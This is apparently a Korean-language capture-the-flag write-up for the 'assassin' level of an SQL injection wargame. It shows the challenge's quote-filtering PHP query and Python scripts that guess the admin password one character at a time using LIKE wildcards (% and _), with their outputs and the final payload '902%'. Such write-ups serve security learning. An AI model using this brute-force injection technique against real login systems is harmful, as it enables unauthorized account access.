# assassin

## 1. Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- 작은 따옴표를 필터링한다.

## 3. Solution
쿼리문을 잘 보면, `like`구문이 쓰인 것을 볼 수 있다.
이는 `%`를 통해 부분 검색을 할 수 있다는 것을 의미한다.


직접 python 스크립트로 대입시켜본 결과, guest와 중복되는 부분이 있음을 인지하였다.
따라서, 여러 부분으로 나누어, 하나씩 찾아봤다.


### a. 첫 번째 자리

변수명 | 값
---|---:
`pw` | `i`%


guest와 겹치는 부분이 존재하여, "Hello admin"이 출력되지 않는것으로 판단했다.
따라서, "Hello guest"또한 수집하며 차근차근 찾아갔다.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}
find_ad = 0

# stage 1
print("stage 1...")
for i in range(48, 123):
    url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=%s%%" % chr(i)
    res = requests.get(url, cookies=cookie)

    if "Hello admin" in res.text:
        print(url.split('?')[1],"-> admin")
        find_ad = 1
        break
    
    elif "Hello guest" in res.text:
        print(url.split('?')[1],"-> guest")
```

결과는 다음과 같다.
```
stage 1...
pw=9% -> guest
pw=_% -> guest
```

일단 숫자`9`를 선택하여 진행시켰다.

---



### b. 두 번째 자리

변수명 | 값
---|---:
`pw` | 9`i`%


스크립트는 위 a. 이하에 붙였으므로, 추가된 내용만 보여주겠다.

```python
# stage 2
print("\nstage 2...")
if not find_ad:
    for i in range(48, 123):
        url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=9%s%%" % chr(i)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            print(url.split('?')[1],"-> admin")
            find_ad = 1
            break

        elif "Hello guest" in res.text:
            print(url.split('?')[1],"-> guest")
```

결과는 다음과 같다.
```
stage 2...
pw=90% -> guest
pw=9_% -> guest
```

여기서도 `_`가 나온다. 하지만, 숫자 0을 선택해봤다.

---



### c. 세 번째 자리

변수명 | 값
---|---:
`pw` | 90`i`%



```python
# stage 3
print("\nstage 3...")
if not find_ad:
    for i in range(48, 123):
        url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=90%s%%" % chr(i)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            print(url.split('?')[1],"-> admin")
            find_ad = 1
            break

        elif "Hello guest" in res.text:
            print(url.split('?')[1],"-> guest")
```

결과는 다음과 같다.
```
stage 3...
pw=902% -> admin
```

드디어 guest와 겹치지 않는 admin pw를 찾아냈다.


끝내기 전에, `_`가 걸렸던 원인을 알아보자.
`_`는 mysql에서 `%`와 같은 와일드 카드이다.<br>
뭔지모르는 한자리 문자를 표현할때 사용한다.
`'ad123'` &rarr; `'ad_23'`, `'ad1_3'`, `'ad12_'`



나온 파라미터 값 `902%`를 넣어주면, 풀리게 된다.